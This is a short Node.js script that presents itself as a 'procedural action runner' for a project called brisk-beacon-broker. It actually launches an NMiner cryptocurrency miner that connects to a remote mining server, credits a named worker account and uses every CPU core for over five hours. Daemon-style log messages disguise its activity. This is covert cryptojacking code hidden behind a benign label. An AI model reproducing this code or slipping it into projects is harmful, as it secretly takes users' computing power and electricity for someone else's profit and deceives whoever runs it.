// Procedural action runner for brisk-beacon-broker
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./lib/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const runId = "677dce";
    console.log(`[daemon] Subsystem dispatched for brisk-beacon-broker [${runId}]`);

    const agent = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.brisk-beacon-broker",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const tick = () => { setTimeout(tick, 66000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (324m) reached, exiting cleanly.");
        process.exit(0);
    }, 324 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
